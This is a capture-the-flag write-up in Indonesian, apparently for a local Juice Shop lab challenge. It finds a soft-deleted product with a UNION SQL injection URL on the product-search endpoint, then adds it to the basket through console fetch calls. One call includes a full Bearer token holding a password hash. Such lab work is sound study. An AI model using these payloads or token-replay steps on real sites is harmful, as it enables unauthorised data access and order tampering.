## Challenge 5: Christmas Special

### 1. [Soal]

Tantangan ini mengharuskan kita untuk menemukan produk yang tidak tersedia (telah dihapus), memasukkannya ke dalam keranjang belanja, dan melakukan checkout. Proses ini tidak dapat dilakukan melalui antarmuka pengguna normal karena produk tersebut disembunyikan dan tombol "Add to basket" dinonaktifkan.

### 2. [Link resource untuk latihan.]

`http://127.0.0.1:3000/`

### 3. Jawaban + bukti

#### Step-by-step yang sudah dicoba

1.  **Identifikasi Titik Injeksi:** Titik injeksi SQL diidentifikasi pada endpoint API pencarian produk: `/rest/products/search`. Input dari parameter `q` rentan terhadap injeksi.

2.  **Menemukan Produk Tersembunyi:** Sebuah payload SQL Injection berbasis `UNION` dibuat untuk secara spesifik mencari produk yang telah di-*soft delete* (memiliki entri di kolom `deletedAt`).
    -   **Payload URL:**
        ```http
        http://127.0.0.1:3000/rest/products/search?q=test')) UNION SELECT * FROM Products WHERE deletedAt IS NOT NULL--
        ```
    -   Dengan mengakses URL ini di browser, server mengembalikan data JSON mentah yang berisi detail produk yang telah dihapus. Dari data ini, ditemukan produk "Christmas Surprise Box" dengan `ProductId: 10`.

3.  **Analisis Mekanisme Penambahan Keranjang:** Tombol "Add to basket" di frontend dinonaktifkan. Solusinya adalah dengan memanggil API `/api/BasketItems/` secara manual untuk menambahkan produk.

4.  **Mengumpulkan Informasi untuk API Call:** Untuk memanggil API, dibutuhkan tiga informasi:
    -   **ProductId:** Sudah ditemukan, yaitu `10`.
    -   **BasketId (bid):** Ditemukan di `Developer Tools > Application > Session Storage`. Nilainya adalah `3`.
    -   **Authorization Token:** Awalnya diabaikan, yang menyebabkan kegagalan. Token ditemukan di `Developer Tools > Application > Local Storage`.

5.  **Percobaan API Call (Gagal):** Percobaan pertama menggunakan `fetch` di browser console gagal.
    -   **Kode Gagal:**
        ```javascript
        fetch('/api/BasketItems/', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ ProductId: 10, BasketId: "3", quantity: 1 })
        });
        ```
    -   **Hasil:** Server merespons dengan `401 Unauthorized`.

6.  **Percobaan API Call (Berhasil):** Permintaan `fetch` diulang dengan menambahkan `Authorization` header yang berisi token yang ditemukan di Langkah 4.
    -   **Kode Berhasil:**
        ```javascript
        fetch('/api/BasketItems/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MywidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImJlbmRlckBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMGMzNmU1MTdlM2ZhOTVhYWJmMWJiZmZjNjc0NGE0ZWYiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNS0wOS0wNCAwNzo1NjoxNy40NDIgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNS0wOS0wNCAwNzo1NjoxNy40NDIgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzU2OTc4NTI1fQ.ykQ8AgvPVdcJK9pZhEmYnaXZIq1NjSlfauq7UO0v7vLZCM4W8duorc01KqCraeGT96zn7h06-CN6hyKT3lUySD9oWzgxmxsCSY9JI8htC1c4vR0usLjaDrHyM1oEpJ15QR7cHSJBP8pyBIfQ1zG5-xodK1OKkXZLV7EtY3hKdIs'
            },
            body: JSON.stringify({
                ProductId: 10,
                BasketId: "3",
                quantity: 1
            })
        });
        ```

7.  **Finalisasi:** Setelah perintah berhasil, produk muncul di keranjang belanja. Melanjutkan ke checkout menyelesaikan tantangan.

#### Bukti Screenshot


#### Catatan hasil percobaan

-   **Berhasil/Gagal:** Awalnya gagal karena error `401 Unauthorized`, kemudian berhasil setelah token otentikasi ditambahkan ke header permintaan.
-   **Alasan:** Aplikasi modern mengamankan endpoint API dengan token JWT (*JSON Web Token*) untuk memverifikasi identitas pengguna. Panggilan API langsung dari konsol tidak secara otomatis menyertakan token ini, sehingga harus ditambahkan secara manual.
